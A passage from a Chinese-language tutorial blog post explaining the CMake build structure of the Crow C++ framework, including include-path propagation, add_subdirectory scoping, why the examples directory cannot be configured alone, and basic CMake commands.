<span class="hljs-comment"># MSVC</span>
cl.exe /I<span class="hljs-string">"C:\path\to\include"</span> example.cpp
</code></pre>
<p><strong>为什么需要这个？</strong></p>
<p>当你的代码写 <code>#include "crow.h"</code> 时：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span>  <span class="hljs-comment">// 编译器需要知道在哪里找这个文件</span></span>
</code></pre>
<p>编译器会：</p>
<ol>
<li>先在当前目录查找 <code>crow.h</code></li>
<li>如果找不到，在 <code>target_include_directories</code> 指定的路径中查找</li>
<li>如果还找不到，报错：<code>fatal error: 'crow.h' file not found</code></li>
</ol>
<p><strong>INTERFACE、PUBLIC、PRIVATE 的区别</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 假设有一个库 MyLib
add_library(MyLib STATIC mylib.cpp)

# PRIVATE：只给自己用，不传播给依赖者
target_include_directories(MyLib PRIVATE 
    ${CMAKE_CURRENT_SOURCE_DIR}/private_headers  # 只有 MyLib 自己用
)

# INTERFACE：只给依赖者用，自己不用
target_include_directories(MyLib INTERFACE 
    ${CMAKE_CURRENT_SOURCE_DIR}/public_headers   # 依赖 MyLib 的目标可以用
)

# PUBLIC：既给自己用，也传播给依赖者
target_include_directories(MyLib PUBLIC 
    ${CMAKE_CURRENT_SOURCE_DIR}/headers          # MyLib 和依赖者都能用
)
</code></pre>
<p><strong>实际例子</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># MyLib 的 CMakeLists.txt
add_library(MyLib STATIC mylib.cpp)
target_include_directories(MyLib PUBLIC include/)  # PUBLIC：传播给使用者

# 你的项目的 CMakeLists.txt
add_executable(myapp main.cpp)
target_link_libraries(myapp MyLib)  # 链接 MyLib

# 编译 myapp 时，编译器会自动添加 -I/path/to/MyLib/include
# 所以 main.cpp 可以写：
# #include "mylib.h"  // ✅ 能找到，因为 MyLib 的 PUBLIC include 路径被传播了
</code></pre>
<p><strong>Crow 项目中的实际使用</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong>解析</strong>：</p>
<ol>
<li><strong><code>INTERFACE</code></strong>：
<ul>
<li>Crow 是 header-only 库，没有自己的源文件需要编译</li>
<li>所以用 <code>INTERFACE</code>，只给使用者提供头文件路径</li>
</ul>
</li>
<li><strong><code>$&lt;BUILD_INTERFACE:...&gt;</code></strong>：
<ul>
<li>这是 CMake 的生成器表达式（Generator Expression）</li>
<li>构建时（<code>cmake --build</code>）使用：<code>${CMAKE_CURRENT_SOURCE_DIR}/include</code></li>
<li>即：<code>C:\Users\notfr\projects\Crow\include</code></li>
</ul>
</li>
<li><strong><code>$&lt;INSTALL_INTERFACE:...&gt;</code></strong>：
<ul>
<li>安装后（<code>cmake --install</code>）使用：<code>include</code></li>
<li>即：安装目录下的 <code>include</code> 文件夹</li>
<li>例如：<code>C:\Program Files\Crow\include</code></li>
</ul>
</li>
</ol>
<p><strong>实际效果</strong>：</p>
<p>当你在代码中写：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span>  <span class="hljs-comment">// 或 #include &lt;crow.h&gt;</span></span>
</code></pre>
<p>编译器会：</p>
<ol>
<li>构建时：在 <code>C:\Users\notfr\projects\Crow\include</code> 中查找</li>
<li>安装后：在 <code>C:\Program Files\Crow\include</code> 中查找</li>
</ol>
<p><strong>为什么需要两个不同的路径？</strong></p>
<ul>
<li><strong>构建时</strong>：头文件在源码目录 <code>include/</code></li>
<li><strong>安装后</strong>：头文件被安装到系统目录 <code>include/</code></li>
<li>使用生成器表达式可以自动切换，无需手动修改</li>
</ul>
<p><strong>本质总结</strong>：</p>
<p><code>target_include_directories</code> 的本质是：</p>
<ol>
<li><strong>设置编译器的头文件搜索路径</strong>（转换为 <code>-I</code> 或 <code>/I</code> 选项）</li>
<li><strong>控制路径的传播</strong>（PRIVATE/INTERFACE/PUBLIC）</li>
<li><strong>支持构建时和安装后的路径切换</strong>（生成器表达式）</li>
<li><strong>让 <code>#include</code> 能找到头文件</strong></li>
</ol>
<p>没有它，编译器就不知道在哪里找头文件，<code>#include "crow.h"</code> 会失败。</p>
</li>
</ol>
<p><strong>这是为什么不能从 examples 目录执行的关键原因之一</strong>：<code>Crow::Crow</code> 目标必须在根目录的 CMakeLists.txt 中定义，<code>examples</code> 目录中的代码依赖这个目标。</p>
<h4 data-id="heading-6">1.4 依赖库查找和链接</h4>
<h5 data-id="heading-7">Asio 库（默认）</h5>
<pre><code class="hljs language-cmake" lang="cmake">else()
    find_package(asio REQUIRED)
    target_link_libraries(Crow
        INTERFACE
            asio::asio
    )
    target_compile_definitions(Crow INTERFACE ASIO_NO_DEPRECATED)
endif()
</code></pre>
<ul>
<li><strong>作用</strong>：查找并链接 Asio 异步 I/O 库</li>
<li><strong>依赖</strong>：使用自定义的 <code>Findasio.cmake</code> 模块（位于 <code>cmake/Findasio.cmake</code>）</li>
</ul>
<h5 data-id="heading-8">可选依赖</h5>
<pre><code class="hljs language-cmake" lang="cmake">if(CROW_ENABLE_COMPRESSION)
    find_package(ZLIB REQUIRED)
    target_link_libraries(Crow INTERFACE ZLIB::ZLIB)
    target_compile_definitions(Crow INTERFACE CROW_ENABLE_COMPRESSION)
endif()

if(CROW_ENABLE_SSL)
    find_package(OpenSSL REQUIRED)
    target_link_libraries(Crow INTERFACE OpenSSL::SSL)
    target_compile_definitions(Crow INTERFACE CROW_ENABLE_SSL)
endif()
</code></pre>
<ul>
<li><strong>作用</strong>：根据编译选项条件性地添加压缩和 SSL 支持</li>
<li><strong>变量传递</strong>：这些选项会影响 <code>CROW_FEATURES</code> 变量，<code>examples</code> 目录会检查这个变量</li>
</ul>
<h4 data-id="heading-9">1.5 子项目集成</h4>
<pre><code class="hljs language-cmake" lang="cmake"># Examples
if(CROW_BUILD_EXAMPLES)
    add_subdirectory(examples)
endif()
</code></pre>
<p><strong><code>add_subdirectory</code> 的本质</strong>：</p>
<p><strong>核心作用</strong>：将子目录的 CMakeLists.txt 包含到当前构建中，创建一个子作用域</p>
<p><code>add_subdirectory</code> 的本质是<strong>在当前 CMake 配置过程中，切换到指定子目录，执行该目录下的 CMakeLists.txt，然后返回</strong>。它创建了一个新的作用域，但保持了与父目录的上下文联系。</p>
<p><strong>执行流程</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录 CMakeLists.txt
add_library(Crow INTERFACE)           # 1. 创建 Crow 目标
set(MY_VAR "value")                  # 2. 设置变量
add_subdirectory(examples)           # 3. 切换到 examples 目录
# 4. 执行 examples/CMakeLists.txt
# 5. 返回根目录，继续执行
</code></pre>
<p><strong>关键机制</strong>：</p>
<ol>
<li>
<p><strong>条件包含</strong>：只有当 <code>CROW_BUILD_EXAMPLES</code> 选项为 <code>ON</code> 时，才会包含 <code>examples</code> 子目录</p>
</li>
<li>
<p><strong>作用域和变量传递</strong>：</p>
<p><strong>父目录 → 子目录（可见）</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录 CMakeLists.txt
set(PARENT_VAR "parent_value")     # 父目录变量
add_library(Crow INTERFACE)        # 父目录目标
add_subdirectory(examples)         # 进入子目录

# examples/CMakeLists.txt
message(STATUS ${PARENT_VAR})      # ✅ 可以访问：输出 "parent_value"
target_link_libraries(myapp Crow)  # ✅ 可以访问：Crow 目标可见
</code></pre>
<p><strong>子目录 → 父目录（不可见）</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># examples/CMakeLists.txt
set(CHILD_VAR "child_value")       # 子目录变量
add_executable(myapp main.cpp)     # 子目录目标

# 根目录 CMakeLists.txt（add_subdirectory 之后）
message(STATUS ${CHILD_VAR})       # ❌ 不可访问：变量未定义
# 但目标 myapp 在整个项目中可见
</code></pre>
</li>
<li>
<p><strong>关键变量行为</strong>：</p>
<p><strong><code>CMAKE_SOURCE_DIR</code></strong>：始终指向<strong>根项目</strong>的源目录</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录 CMakeLists.txt
message(STATUS "Root: ${CMAKE_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow
add_subdirectory(examples)

# examples/CMakeLists.txt
message(STATUS "Examples: ${CMAKE_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow（相同！）
</code></pre>
<p><strong><code>CMAKE_CURRENT_SOURCE_DIR</code></strong>：指向<strong>当前</strong>CMakeLists.txt 所在的目录</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录 CMakeLists.txt
message(STATUS "Root current: ${CMAKE_CURRENT_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow
add_subdirectory(examples)

# examples/CMakeLists.txt
message(STATUS "Examples current: ${CMAKE_CURRENT_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow/examples
</code></pre>
<p><strong><code>CMAKE_BINARY_DIR</code></strong>：始终指向<strong>根项目</strong>的构建目录</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录和子目录的 CMAKE_BINARY_DIR 都相同
# 例如：C:/Users/notfr/projects/Crow/build
</code></pre>
<p><strong><code>CMAKE_CURRENT_BINARY_DIR</code></strong>：指向<strong>当前</strong>CMakeLists.txt 对应的构建目录</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录：C:/Users/notfr/projects/Crow/build
# examples：C:/Users/notfr/projects/Crow/build/examples
</code></pre>
</li>
<li>
<p><strong>目标可见性</strong>：</p>
<ul>
<li>父目录创建的目标在子目录中<strong>可见且可用</strong></li>
<li>子目录创建的目标在父目录中<strong>可见</strong>（但变量不可见）</li>
<li>所有目标在整个项目中可见（除非使用特殊作用域控制）</li>
</ul>
</li>
<li>
<p><strong>函数和宏的传递</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录 CMakeLists.txt
include(cmake/compiler_options.cmake)  # 定义函数 add_warnings_optimizations()
add_subdirectory(examples)

# examples/CMakeLists.txt
add_warnings_optimizations(myapp)  # ✅ 可以使用父目录定义的函数
</code></pre>
</li>
</ol>
<p><strong>实际例子</strong>：</p>
<p>在 Crow 项目中：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 根目录 CMakeLists.txt
add_library(Crow INTERFACE)                    # 创建 Crow 目标
target_include_directories(Crow INTERFACE ...) # 配置 Crow
add_library(Crow::Crow ALIAS Crow)            # 创建别名

if(CROW_BUILD_EXAMPLES)
    add_subdirectory(examples)  # 进入 examples 目录
endif()

# examples/CMakeLists.txt
add_executable(basic_example example.cpp)
target_link_libraries(basic_example PUBLIC Crow::Crow)  # ✅ 可以使用父目录的 Crow::Crow
</code></pre>
<p><strong>执行时的变量值</strong>：</p>






























<table><thead><tr><th>变量</th><th>根目录 CMakeLists.txt</th><th>examples/CMakeLists.txt</th></tr></thead><tbody><tr><td><code>CMAKE_SOURCE_DIR</code></td><td><code>C:/.../Crow</code></td><td><code>C:/.../Crow</code>（相同）</td></tr><tr><td><code>CMAKE_CURRENT_SOURCE_DIR</code></td><td><code>C:/.../Crow</code></td><td><code>C:/.../Crow/examples</code></td></tr><tr><td><code>CMAKE_BINARY_DIR</code></td><td><code>C:/.../Crow/build</code></td><td><code>C:/.../Crow/build</code>（相同）</td></tr><tr><td><code>CMAKE_CURRENT_BINARY_DIR</code></td><td><code>C:/.../Crow/build</code></td><td><code>C:/.../Crow/build/examples</code></td></tr></tbody></table>
<p><strong>本质总结</strong>：</p>
<p><code>add_subdirectory</code> 的本质是：</p>
<ol>
<li><strong>切换目录</strong>：临时切换到子目录，执行其 CMakeLists.txt</li>
<li><strong>创建子作用域</strong>：子目录有自己的变量作用域，但可以访问父目录的变量和目标</li>
<li><strong>保持上下文</strong>：<code>CMAKE_SOURCE_DIR</code> 始终指向根项目，保持项目结构的一致性</li>
<li><strong>目标全局可见</strong>：所有目标在整个项目中可见，实现依赖管理</li>
<li><strong>函数传递</strong>：父目录定义的函数和宏在子目录中可用</li>
</ol>
<p><strong>为什么不能从子目录独立执行？</strong></p>
<p>因为 <code>add_subdirectory</code> 创建的是<strong>子作用域</strong>，不是独立项目：</p>
<ul>
<li>子目录依赖父目录的上下文（变量、目标、函数）</li>
<li><code>CMAKE_SOURCE_DIR</code> 必须指向根项目</li>
<li>如果从子目录执行，这些上下文都不存在，会失败</li>
</ul>
<p>这是 CMake 的设计哲学：<strong>子项目是父项目的组成部分，不是独立项目</strong>。</p>
<h4 data-id="heading-10">1.6 编译选项函数定义</h4>
<p>根目录通过包含 <code>compiler_options.cmake</code> 定义了 <code>add_warnings_optimizations()</code> 函数：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 在 cmake/compiler_options.cmake 中定义
function(add_warnings_optimizations target_name)
    # 根据编译器类型（MSVC、Clang、GCC）设置不同的警告和优化选项
    ...
endfunction()
</code></pre>
<p>这个函数在 <code>examples/CMakeLists.txt</code> 中被广泛使用。</p>
<h3 data-id="heading-11">二、examples 目录 CMakeLists.txt 核心内容</h3>
<p><code>examples/CMakeLists.txt</code> 是一个<strong>子项目</strong>的构建文件，它依赖于父目录（根目录）提供的所有基础设施。</p>
<h4 data-id="heading-12">2.1 项目声明</h4>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.15)
project(crow_examples)
</code></pre>
<ul>
<li><strong>注意</strong>：这里虽然声明了 <code>project(crow_examples)</code>，但这不是一个独立的项目</li>
<li><strong>上下文</strong>：当通过 <code>add_subdirectory(examples)</code> 调用时，这个 <code>project()</code> 命令会创建一个子项目，但 <code>CMAKE_SOURCE_DIR</code> 仍然指向根目录</li>
</ul>
<h4 data-id="heading-13">2.2 依赖父目录的 CMake 模块</h4>
<pre><code class="hljs language-cmake" lang="cmake">include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)
</code></pre>
<p><strong>关键分析</strong>：</p>
<ol>
<li><strong><code>CMAKE_SOURCE_DIR</code> 的含义</strong>：
<ul>
<li>在根目录执行 CMake 时：<code>CMAKE_SOURCE_DIR</code> = 项目根目录</li>
<li>在 <code>examples</code> 目录执行 CMake 时：<code>CMAKE_SOURCE_DIR</code> = <code>examples</code> 目录</li>
</ul>
</li>
<li><strong>路径解析</strong>：
<ul>
<li>从根目录执行：<code>${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake</code> = <code>根目录/cmake/compiler_options.cmake</code> ✅</li>
<li>从 <code>examples</code> 目录执行：<code>${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake</code> = <code>examples/cmake/compiler_options.cmake</code> ❌（路径不存在）</li>
</ul>
</li>
</ol>
<p><strong>这是为什么不能从 examples 目录执行的第一个原因</strong>：路径解析错误。</p>
<h4 data-id="heading-14">2.3 依赖父目录定义的目标</h4>
<pre><code class="hljs language-cmake" lang="cmake">add_executable(basic_example example.cpp)
add_warnings_optimizations(basic_example)
target_link_libraries(basic_example PUBLIC Crow::Crow)
</code></pre>
<p><strong>依赖链分析</strong>：</p>
<ol>
<li>
<p><strong><code>add_warnings_optimizations()</code> 函数</strong>：</p>
<ul>
<li>定义在 <code>cmake/compiler_options.cmake</code> 中</li>
<li>该文件通过 <code>include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)</code> 引入</li>
<li>如果路径解析失败，函数不存在，构建会失败</li>
</ul>
</li>
<li>
<p><strong><code>Crow::Crow</code> 目标</strong>：</p>
<ul>
<li>在根目录的 <code>CMakeLists.txt</code> 中定义（第 88-89 行）</li>
<li>是一个 INTERFACE 库，包含：
<ul>
<li>头文件路径：<code>${CMAKE_CURRENT_SOURCE_DIR}/include</code></li>
<li>链接库：<code>asio::asio</code>（或 Boost 库）</li>
<li>编译定义：<code>ASIO_NO_DEPRECATED</code> 等</li>
</ul>
</li>
<li>如果从 <code>examples</code> 目录执行，这个目标不存在，<code>target_link_libraries()</code> 会报错</li>
</ul>
</li>
</ol>
<p><strong>这是为什么不能从 examples 目录执行的第二个原因</strong>：目标不存在。</p>
<h4 data-id="heading-15">2.4 依赖父目录定义的变量</h4>
<pre><code class="hljs language-cmake" lang="cmake"># If compression is enabled, the example will be built
if("compression" IN_LIST CROW_FEATURES)
    add_executable(example_compression example_compression.cpp)
    ...
endif()

if(CROW_AMALGAMATE)
    add_executable(example_with_all example_with_all.cpp)
    add_dependencies(example_with_all crow_amalgamated)
    ...
endif()
</code></pre>
<p><strong>变量依赖</strong>：</p>
<ol>
<li><strong><code>CROW_FEATURES</code></strong>：在根目录的 CMakeLists.txt 中根据 <code>CROW_ENABLE_COMPRESSION</code> 和 <code>CROW_ENABLE_SSL</code> 选项设置</li>
<li><strong><code>CROW_AMALGAMATE</code></strong>：在根目录定义为 CMake 选项</li>
<li><strong><code>crow_amalgamated</code></strong>：在根目录定义的自定义目标（如果启用了 amalgamate）</li>
</ol>
<p><strong>这是为什么不能从 examples 目录执行的第三个原因</strong>：变量未定义。</p>
<h3 data-id="heading-16">三、依赖关系图</h3>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────┐
│           根目录 CMakeLists<span class="hljs-selector-class">.txt</span>                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">1</span>. 配置 CMAKE_MODULE_PATH                        │   │
│  │    → 添加 cmake/ 目录                            │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">2</span>. 定义 Crow::Crow INTERFACE 库                   │   │
│  │    → 包含目录: include/                          │   │
│  │    → 链接库: asio::asio                          │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">3</span>. 查找依赖库                                     │   │
│  │    → <span class="hljs-built_in">find_package</span>(asio)                          │   │
│  │    → <span class="hljs-built_in">find_package</span>(ZLIB) [可选]                   │   │
│  │    → <span class="hljs-built_in">find_package</span>(OpenSSL) [可选]                │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">4</span>. 设置变量                                       │   │
│  │    → CROW_FEATURES                               │   │
│  │    → CROW_AMALGAMATE                             │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">5</span>. <span class="hljs-built_in">add_subdirectory</span>(examples)                    │   │
│  │    → 执行 examples/CMakeLists.txt                │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
                        │
                        │ 依赖
                        ▼
┌─────────────────────────────────────────────────────────┐
│         examples/CMakeLists.txt                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">1</span>. <span class="hljs-built_in">include</span>(${CMAKE_SOURCE_DIR}/cmake/...)        │   │
│  │    ← 需要根目录的 cmake/ 目录                     │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">2</span>. <span class="hljs-built_in">add_warnings_optimizations</span>()                  │   │
│  │    ← 需要 compiler_options<span class="hljs-selector-class">.cmake</span> 中的函数       │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">3</span>. <span class="hljs-built_in">target_link_libraries</span>(..., Crow::Crow)       │   │
│  │    ← 需要根目录定义的 Crow::Crow 目标            │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │ <span class="hljs-number">4</span>. <span class="hljs-built_in">if</span>(<span class="hljs-string">"compression"</span> IN_LIST CROW_FEATURES)      │   │
│  │    ← 需要根目录设置的 CROW_FEATURES 变量         │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-17">四、为什么不能从 examples 目录开始执行</h3>
<h4 data-id="heading-18">4.1 路径解析问题</h4>
<p><strong>场景</strong>：在 <code>examples</code> 目录执行 <code>cmake .</code></p>
<pre><code class="hljs language-cmake" lang="cmake">include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)
</code></pre>
<ul>
<li><code>CMAKE_SOURCE_DIR</code> = <code>C:/Users/notfr/projects/Crow/examples</code></li>
<li>解析路径：<code>examples/cmake/compiler_options.cmake</code> ❌</li>
<li>实际路径：<code>根目录/cmake/compiler_options.cmake</code> ✅</li>
</ul>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span> at <span class="hljs-title class_">CMakeLists</span>.<span class="hljs-property">txt</span>:<span class="hljs-number">4</span> (include):
  include could not find load <span class="hljs-attr">file</span>:
    <span class="hljs-attr">C</span>:<span class="hljs-regexp">/Users/</span>notfr/projects/<span class="hljs-title class_">Crow</span>/examples/cmake/compiler_options.<span class="hljs-property">cmake</span>
</code></pre>
<h4 data-id="heading-19">4.2 目标不存在问题</h4>
<p><strong>场景</strong>：即使修复了路径问题，继续执行</p>
<pre><code class="hljs language-cmake" lang="cmake">target_link_libraries(basic_example PUBLIC Crow::Crow)
</code></pre>
<ul>
<li><code>Crow::Crow</code> 目标在根目录的 <code>CMakeLists.txt</code> 中定义</li>
<li>从 <code>examples</code> 目录执行时，根目录的 <code>CMakeLists.txt</code> 未执行</li>
<li>目标不存在</li>
</ul>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CMake Error at CMakeLists.txt:<span class="hljs-number">40</span> (target_link_libraries):
  Cannot specify link libraries <span class="hljs-keyword">for</span> target <span class="hljs-string">"basic_example"</span> which <span class="hljs-keyword">is</span> not
  built <span class="hljs-keyword">by</span> <span class="hljs-keyword">this</span> project.
  
  CMake Error: The following variables are used <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> project, but they are
  <span class="hljs-keyword">set</span> to NOTFOUND.
  Please <span class="hljs-keyword">set</span> them or make sure they are <span class="hljs-keyword">set</span> correctly:
  Crow::Crow
</code></pre>
<h4 data-id="heading-20">4.3 依赖库未查找问题</h4>
<p>即使手动创建了 <code>Crow::Crow</code> 目标，还需要：</p>
<ol>
<li>
<p><strong>查找 asio 库</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">find_package(asio REQUIRED)
</code></pre>
<ul>
<li>需要根目录的 <code>cmake/Findasio.cmake</code> 模块</li>
<li>需要正确的 <code>CMAKE_MODULE_PATH</code> 配置</li>
</ul>
</li>
<li>
<p><strong>设置包含目录</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow INTERFACE ${CMAKE_CURRENT_SOURCE_DIR}/include)
</code></pre>
<ul>
<li><code>CMAKE_CURRENT_SOURCE_DIR</code> 在 <code>examples</code> 目录执行时指向 <code>examples</code></li>
<li>但头文件在根目录的 <code>include/</code> 中</li>
</ul>
</li>
</ol>
<h4 data-id="heading-21">4.4 变量未定义问题</h4>
<pre><code class="hljs language-cmake" lang="cmake">if("compression" IN_LIST CROW_FEATURES)
</code></pre>
<ul>
<li><code>CROW_FEATURES</code> 在根目录根据 <code>CROW_ENABLE_COMPRESSION</code> 和 <code>CROW_ENABLE_SSL</code> 设置</li>
<li>从 <code>examples</code> 目录执行时，这些变量未定义</li>
<li>条件判断可能产生意外行为</li>
</ul>
<h4 data-id="heading-22">4.5 CMake 子项目机制的本质</h4>
<p>CMake 的 <code>add_subdirectory()</code> 机制设计上就是<strong>单向依赖</strong>的：</p>
<ul>
<li><strong>父目录 → 子目录</strong>：父目录的所有定义（目标、变量、函数）对子目录可见 ✅</li>
<li><strong>子目录 → 父目录</strong>：子目录不能独立运行，必须通过父目录调用 ❌</li>
</ul>
<p>这是 CMake 的设计哲学：<strong>子项目是父项目的组成部分，不是独立项目</strong>。</p>
<h3 data-id="heading-23">五、正确的使用方式</h3>
<h4 data-id="heading-24">5.1 标准构建流程</h4>
<pre><code class="hljs language-powershell" lang="powershell"># 1. 在根目录配置 CMake
cd C:\Users\notfr\projects\Crow
cmake -B build -S .

# 2. 在根目录构建所有目标
cmake --build build

# 3. 在根目录只构建 basic_example
cmake --build build --target basic_example
</code></pre>
<h4 data-id="heading-25">5.2 为什么这样设计</h4>
<ol>
<li><strong>单一配置源</strong>：所有 CMake 选项（如 <code>CROW_ENABLE_SSL</code>）在根目录统一配置</li>
<li><strong>依赖管理集中</strong>：所有依赖库（asio、OpenSSL 等）在根目录统一查找和配置</li>
<li><strong>目标可见性</strong>：<code>Crow::Crow</code> 目标对所有子项目可见</li>
<li><strong>构建一致性</strong>：确保所有子项目使用相同的编译选项和配置</li>
</ol>
<h4 data-id="heading-26">5.3 如果确实需要独立构建</h4>
<p>如果确实需要从 <code>examples</code> 目录独立构建（不推荐），需要：</p>
<ol>
<li>
<p><strong>修改路径引用</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 使用相对路径或绝对路径
include(../cmake/compiler_options.cmake)
</code></pre>
</li>
<li>
<p><strong>手动定义 Crow::Crow 目标</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 查找依赖
list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/../cmake)
find_package(asio REQUIRED)

# 创建目标
add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)
target_include_directories(Crow INTERFACE ${CMAKE_CURRENT_SOURCE_DIR}/../include)
target_link_libraries(Crow INTERFACE asio::asio)
</code></pre>
</li>
<li>
<p><strong>设置必要的变量</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">if(NOT DEFINED CROW_FEATURES)
    set(CROW_FEATURES "")
endif()
</code></pre>
</li>
</ol>
<p>但这样做会：</p>
<ul>
<li>破坏项目的统一性</li>
<li>增加维护成本</li>
<li>可能导致配置不一致</li>
</ul>
<h3 data-id="heading-27">六、总结</h3>
<h4 data-id="heading-28">6.1 核心要点</h4>
<ol>
<li>
<p><strong>根目录 CMakeLists.txt</strong> 是构建系统的核心：</p>
<ul>
<li>定义项目基础设施</li>
<li>查找和配置所有依赖库</li>
<li>创建 <code>Crow::Crow</code> INTERFACE 库目标</li>
<li>设置全局变量和选项</li>
</ul>
</li>
<li>
<p><strong>examples/CMakeLists.txt</strong> 是子项目：</p>
<ul>
<li>依赖父目录的所有定义</li>
<li>使用父目录的目标、变量和函数</li>
<li>不能独立运行</li>
</ul>
</li>
<li>
<p><strong>不能从 examples 目录执行的原因</strong>：</p>
<ul>
<li>路径解析错误（<code>CMAKE_SOURCE_DIR</code> 指向错误）</li>
<li>目标不存在（<code>Crow::Crow</code> 未定义）</li>
<li>依赖库未查找（asio 等）</li>
<li>变量未定义（<code>CROW_FEATURES</code> 等）</li>
<li>违反 CMake 子项目设计原则</li>
</ul>
</li>
</ol>
<h4 data-id="heading-29">6.2 最佳实践</h4>
<ul>
<li>✅ <strong>始终从根目录执行 CMake</strong></li>
<li>✅ <strong>使用 <code>--target</code> 选项只构建需要的目标</strong></li>
<li>✅ <strong>保持子项目对父目录的依赖关系</strong></li>
<li>❌ <strong>不要尝试从子目录独立构建</strong></li>
</ul>
<h4 data-id="heading-30">6.3 设计哲学</h4>
<p>Crow 项目的 CMake 结构体现了现代 CMake 的最佳实践：</p>
<ul>
<li><strong>接口库（INTERFACE Library）</strong>：适合 header-only 库</li>
<li><strong>目标导向</strong>：使用 <code>target_*</code> 命令而非全局变量</li>
<li><strong>子项目组织</strong>：通过 <code>add_subdirectory()</code> 管理复杂项目</li>
<li><strong>依赖传播</strong>：通过 INTERFACE 属性自动传播依赖</li>
</ul>
<p>这种设计确保了构建系统的一致性、可维护性和可扩展性。</p>
<h2 data-id="heading-31">附1 Cmake三个最重要的语法</h2>
<p>我们用“剃刀原则”（即奥卡姆剃刀：如无必要，勿增实体）来思考 CMake —— 只保留最核心、最必要、能支撑绝大多数项目的三个语法要素。去掉花里胡哨的细节，只讲真正“不可或缺”的三件套。</p>
<hr/>
<h4 data-id="heading-32">✂️ 剃刀原则下的 CMake 最重要三个语法：</h4>
<h5 data-id="heading-33">1. <strong>project() —— 定义你的项目名字和语言</strong></h5>
<blockquote>
<p><strong>为什么必要？</strong> 没有项目，CMake 就不知道你在构建什么。</p>
<p><strong>通俗理解</strong>：就像你写作文要先起个标题，<code>project()</code> 就是给你的代码工程起个“名字”。</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># 最简形式
project(MyApp)

# 更常见：指定语言（C++ 是默认，但显式写出更清晰）
project(MyApp LANGUAGES CXX)
</code></pre>
<p>✅ <strong>剃刀理由</strong>：没有 <code>project()</code>，后续很多变量（比如 <code>${PROJECT_NAME}</code>）都无法使用，构建系统也无法正确初始化。</p>
<hr/>
<h5 data-id="heading-34">2. <strong>add_executable() 或 add_library() —— 告诉 CMake 要生成什么</strong></h5>
<blockquote>
<p><strong>为什么必要？</strong> 你总得告诉 CMake：“我要编译出一个可执行程序”还是“我要打包成一个库”。</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># 编译一个叫 my_app 的可执行文件，源码是 main.cpp
add_executable(my_app main.cpp utils.cpp)

# 或者编译一个静态库
add_library(my_utils STATIC utils.cpp helper.cpp)
</code></pre>
<p>✅ <strong>剃刀理由</strong>：这是 CMake 的“目标”（target）机制的核心。不定义目标，就没有任何东西会被编译！</p>
<hr/>
<h5 data-id="heading-35">3. <strong>target_link_libraries() —— 告诉 CMake 目标依赖什么</strong></h5>
<blockquote>
<p><strong>为什么必要？</strong> 程序很少孤立存在，通常要链接标准库、第三方库，或者自己写的其他模块。</p>
</blockquote>
